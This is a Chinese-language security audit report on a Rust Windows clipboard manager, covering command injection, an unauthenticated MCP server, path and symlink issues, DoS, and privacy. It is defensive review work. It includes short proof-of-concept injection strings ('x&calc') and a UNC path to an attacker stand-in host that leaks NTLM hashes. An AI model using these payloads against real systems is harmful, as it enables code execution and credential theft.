# qa-sec：安全审查报告（2026-10-12）

> 只读审查，未改任何文件。范围：全部 9 个 crate（65 个 .rs 文件），重点 unsafe 块、命令注入、SQL 注入、路径安全、隐私、Windows 特定面、依赖供应链。每条均经代码核实。

## P0 = 可直接利用的安全漏洞

- [SEC-001] P0 | platform/src/lib.rs:169-189 | run_command 经 `cmd /C` 执行未转义剪贴板内容，构成任意命令执行
  `Command::new("cmd").args(["/C", program, &substituted])`。program 恒为 "start"（action.rs:193-202），substituted = URL 模板 + 剪贴板原文——CommandAction::plan（action.rs:172-173）用 `arg_template.replace("{selection}", item.preview.trim())` 原样替换，无转义。cmd 的 `&`/`|` 是命令分隔符。PoC：剪贴板 `x&calc` → `cmd /C start https://www.bing.com/search?q=x&calc` → calc 被启动。内嵌 `"` 可按 cmd 奇偶引号配对规则逃逸。非 Windows 分支更糟：`sh -c "{program} {substituted}"` 完全字符串拼接。
  利用条件：用户点击条目上的联动动作按钮（Service::run_action → action::dispatch，app/lib.rs:500-501）。当前 UI 尚未接线动作执行按钮，但 API 公开、集成测试已在用、builtin_rule_templates（action.rs:341-348）为设置页「一键添加」准备——代码路径完整就绪，一次 UI 迭代即激活。
  建议：program 收敛为固定白名单（当前只有 "start"）；selection 进入 URL 前必须 percent-encode；彻底方案是 URL 类动作不用 cmd，改用 ShellExecuteW/explorer。

- [SEC-002] P0 | platform/src/lib.rs:131-146 | open_url 的 `cmd /C start "" url` 同样可被剪贴板 URL 注入
  url 直接来自剪贴板文本（action.rs:111-113）。`looks_like_url`（lib.rs:93-101）只校验 https:// 前缀与非空白，**不排除 `&`、`|`、`^` 等 cmd 元字符**。PoC：复制 `https://a.com/&calc` → 执行 calc。
  利用条件：同 SEC-001。
  建议：弃用 cmd/start 拼 URL；用 `ShellExecuteW(NULL, "open", url)` 或先对 url 做严格字符校验再执行。

## P1 = 需特定条件的安全问题

- [SEC-003] P1 | core/src/config.rs:374-393 + mcp/src/http.rs:22-29,99-104 | MCP 服务默认启用且默认无鉴权，本地任意进程可窃取剪贴板明文并完全操控界面
  `McpConfig::default()` 为 `enabled: true, token: ""`。HTTP 模式绑 127.0.0.1:9123——Windows loopback 对本机所有进程及其他登录用户开放。9 个工具中 clipboard read 直接返回系统剪贴板全文，screen_capture 截任意窗口，type_text/key_press/click_element 可组合成任意命令执行。直接击穿产品核心价值：程序自己用 blocked_apps 防密码管理器泄露，而 MCP 无认证即可读走剪贴板里的密码。stdio 模式无任何鉴权。
  建议：首次启动生成随机 token 写入 config.json；token 为空时拒绝绑定非 loopback 地址；clipboard read / screen_capture 拆出独立高危开关（默认关）。

- [SEC-004] P1 | capture/src/lib.rs:275-314 + app/src/lib.rs:355 | blocked_apps 记录的是「读取时前台进程」而非「写剪贴板的进程」，可被后台静默写入绕过
  source_app 来自 GetForegroundWindow 所属进程。任意后台进程随时可 OpenClipboard 写入，用户前台是 notepad → source_app="notepad" → 屏蔽名单形同虚设。附带边界：用户填 "keepass.exe"（带扩展名）永不命中——进程名经 Path::file_stem 去掉扩展名；to_ascii_lowercase 不折叠非 ASCII 大小写。
  建议：ingest 时同时记录 GetClipboardOwner 的进程名并参与屏蔽判定；设置 UI 提示"填进程名主名（不含 .exe）"。

- [SEC-005] P1 | store/src/lib.rs:130-147 | %TEMP% 载荷目录名可预测且不检查 symlink/junction，敏感载荷可被引到任意目录
  `open_in_memory` 的 blob_dir = `%TEMP%\modular-clipboard-mem-<pid>-<n>`，pid 可枚举、n 从 0 递增，完全可预测。create_dir_all 之前不检查该路径是否已是 reparse point。攻击者预置 junction 后，降级模式下写入的剪贴板载荷（明文敏感数据）落入攻击者选定目录。
  建议：创建前用 symlink_metadata 检测并拒绝 reparse point；或目录名加随机分量。

- [SEC-006] P1 | store/src/lib.rs:494,541 | DB 行内 blob_file 未做路径规范化，DB 被篡改时可作任意文件读/删原语
  load_payload/delete 直接 `self.blob_dir.join(&p.file)`，blob_file 来自 SQLite 行。history.db 与 blobs 同目录同权限，任何能改 DB 的本地代码可让程序读任意文件或删任意文件。增量风险有限，但提供了干净的原语，未来若有"导入历史库"功能即升级为真实漏洞。
  建议：读取路径后强制规范化：p.file 必须是纯文件名、以 .bin 结尾、不含路径分隔符与 `..`，否则拒绝。

- [SEC-007] P1 | mcp/src/http.rs:53-110 | MCP HTTP 请求解析无资源上限，可被本地 DoS
  header 行 read_line 无长度上限；body `vec![0u8; content_length]` 无上限（声明 Content-Length: 4GB 直接分配失败 abort）；body 不完整时 read_exact 挂住连接，每连接一线程可累积。
  建议：header 行 8KB 上限、body 8MB 上限、读超时。

## P2 = 加固项

- [SEC-008] P2 | app/src/lib.rs:730-735 | 不可信剪贴板图片解码无尺寸/内存上限，解压炸弹可致 OOM
  `decode_to_rgba` 对任意来源图片 `image::load_from_memory` 全量解码为 RGBA。32MB 的 PNG/WebP 可声明超大尺寸，解码内存放大数十倍。触发点：用户点击含恶意图片的历史条目（copy_item）。
  建议：解码前用 compute_dims 校验 w*h ≤ 阈值（如 1 亿像素）。（image 0.25 默认 Limits 是否已限制需联核实测。）

- [SEC-009] P2 | gfx/src/backdrop.rs:258-267；mcp/src/capture.rs:44,72；platform/src/tray.rs:455-471 | 错误路径与 Drop 顺序导致 GDI/USER 对象泄漏
  (a) DesktopCapture::Drop 未先把位图从 mem_dc 解绑就删，DeleteObject 对选中中的位图失败 → DIB 泄漏，磨砂窗口反复创建/销毁可累积（默认 GDI 每进程上限 10000）；(b) mcp capture 的 BitBlt 失败 `?` 提前返回，mem_dc/bmp/screen_dc 全部泄漏；(c) tray release 未销毁菜单宿主窗口、未注销其类。
  建议：错误路径用 guard 结构；Drop 先 SelectObject(null) 再删；tray 收尾补 DestroyWindow+UnregisterClass。

- [SEC-010] P2 | modular-clipboard/src/main.rs:340,366-368 | 固定名单例互斥体可被本地进程预持造成 DoS；创建失败时 unwrap panic
  `Global\ModularClipboard.SingleInstance` 名字公开且固定，任意本地进程可先创建并持有 → 主程序永远无法启动。CreateMutexW 返回 Err 时 `handle.unwrap()` 直接 panic。
  建议：unwrap 改友好错误路径；接受 DoS 风险（低）或改文件锁。

- [SEC-011] P2 | platform/src/lib.rs:112-128 + app/src/action.rs:240-243 | UNC 路径经 explorer 打开触发 SMB 凭据（NTLM）泄露
  extract_path 明确放行 `\\` 开头的 UNC。剪贴板 `\\attacker.example\x` → explorer → 系统发起 SMB 认证，NetNTLMv2 哈希发往攻击者服务器。
  建议：UNC 打开前弹确认；或直接拒绝 UNC。

- [SEC-012] P2 | store/src/lib.rs:447 | FTS 回退路径把用户搜索词写入日志
  `tracing::debug!(%err, %q, ...)` 记录搜索词原文。默认 filter 为 info 不输出，但 RUST_LOG=debug 时明文进 app.log。（已逐个审计全部 tracing 调用点：剪贴板正文、preview、载荷均未入日志，这点做得对。）
  建议：q 截断至 32 字符或记哈希。

## P3 = 纵深防御建议

- [SEC-013] P3 | mcp/src/http.rs:99 | Bearer token 用 `!=` 非常量时间比较。建议常量时间比较。
- [SEC-014] P3 | platform/src/lib.rs:183-187 | 非 Windows run_command 分支 `sh -c "{program} {substituted}"` 完全拼接。项目当前 Windows-only，但代码在，跨平台即激活。建议统一参数数组、不走 shell。
- [SEC-015] P3 | platform/src/lib.rs:215 | 自启值 `format!("\"{exe_path}\"")`，exe_path 含引号可注入附加启动项。当前无调用方（UI 未接线），接线前加校验（拒 `"`）。
- [SEC-016] P3 | platform/src/lib.rs:93-101 | looks_like_url 不排除控制字符与 RTL 覆盖字符（`https://a\u202Eb.com` 可做显示混淆钓鱼）。建议过滤 Cc/Cf 类别。
- [SEC-017] P3 | platform/src/lib.rs:169-189 + action.rs:196 | 内置 URL 模板缺 `""` 标题参数，selection 含空格时 start 把 URL 当窗口标题，动作静默失效（功能缺陷，佐证该路径缺乏端到端测试）。
- [SEC-018] P3 | store/src/lib.rs:265-281 | preview 无长度截断，大文本全文入 DB+FTS，与 max_items=10000 叠加可致库膨胀。非安全项，附注。

## unsafe 代码审查结论
逐块审查全部 unsafe（capture 3 处、platform 约 25 处、gfx 约 30 处、mcp 约 20 处、main 3 处、ui 1 处）：**未发现内存安全漏洞**。gfx Vulkan FFI 质量很高——BufferGuard 处理失败路径、map/write 有边界与并发断言、staging 有 owner_frame 记账防 UAF、frame 有 per-image semaphore 与 fence 管理。Win32 UTF-16 转换均正确。wnd_proc 全部无状态，无窗口消息 UAF。问题集中在资源生命周期（SEC-009）而非内存安全。提示：`unsafe impl Send for DesktopCapture`（backdrop.rs:122）建议文档化线程约束。

## SQL 注入结论
**未发现注入**。所有 rusqlite 调用均参数化；format! 仅拼接编译期常量片段。FTS 查询 `items_fts MATCH ?1` 参数化，语法错误回退 LIKE 且 LIKE 有正确的 escape_like。FTS5 特殊字符有测试覆盖。

## 隐私结论
剪贴板明文**未**进入日志/错误信息/UI 提示（全部调用点核实）。MCP 响应把剪贴板全文回给客户端是设计用途（见 SEC-003 的鉴权缺失）。密码屏蔽机制的可绕过性见 SEC-004——叠加已知的明文存储缺口，敏感数据聚集面比 ARCHITECTURE.md 描述的大。

## Windows 特定面结论
DLL 搜索顺序：无 LoadLibrary 动态加载第三方 DLL，Vulkan 通过 ash 静态链接 vulkan-1——无 DLL 劫持面。config.json 用 .tmp+rename 原子写。注册表自启只写 HKCU Run。窗口消息 UAF 未发现。热键 RegisterHotKey 失败优雅降级。

## 依赖供应链结论
Cargo.lock 实际版本：rusqlite 0.40.2、arboard 3.6.1、ash 0.38.0、image 0.25.10、windows 0.62.2、egui 0.36.2、serde_json 1.0.151、sha2 0.10.9、anyhow 1.0.104、tracing-subscriber 0.3.23。**均为 2025 年中旬水位，未发现著名未修 CVE**。需联核项：(1) image-webp 历史上 libwebp CVE，需 cargo audit；(2) bundled SQLite 小版本需对照 sqlite.org；(3) 建议 CI 接 cargo audit / cargo deny。另：workspace.dependencies 声明了 global-hotkey 0.8 与 trash 5.2 但无 crate 使用（不在 Cargo.lock）——声明与使用漂移，建议清理。

## 总体评价

安全态势：**代码工程质量明显高于平均水平**——unsafe 全部有 SAFETY 论证、SQL 零注入、日志不记明文、Vulkan 资源管理有 guard/fence 记账。主要风险不在内存安全，而在两处架构性缺口：(1) 不可信输入（剪贴板内容）未经任何编码/过滤就进入进程创建路径（SEC-001/002）；(2) MCP 默认配置（enabled + 空 token）把读剪贴板、截屏、键鼠模拟能力暴露给本机所有进程（SEC-003）。

最危险的 3 个点：
1. SEC-001/002 命令注入链：`cmd /C start` + 未转义 `{selection}`。剪贴板管理器处理的恰是最典型的不可信输入源；链路已完整就绪，只差 UI 接线。修复成本低（percent-encode + 白名单），收益是消除 RCE 级风险。
2. SEC-003 MCP 默认无鉴权：直接读走剪贴板密码的能力，与产品自身 blocked_apps 的防护目标自相矛盾；一旦用户配置 0.0.0.0 即远程。默认生成 token 是低成本修复。
3. SEC-004 blocked_apps 可绕过 + 明文存储叠加：来源进程屏蔽对"后台静默写剪贴板"完全无效，而载荷明文聚集在 blobs/。建议至少在文档中如实标注该机制的边界（前台启发式），并评估 GetClipboardOwner 方案。

修复优先级建议：SEC-001/002（P0，接线前必须修）→ SEC-003（P1，默认 token）→ SEC-004（P1，文档标注 + GetClipboardOwner）→ 其余按 P1/P2 排期。
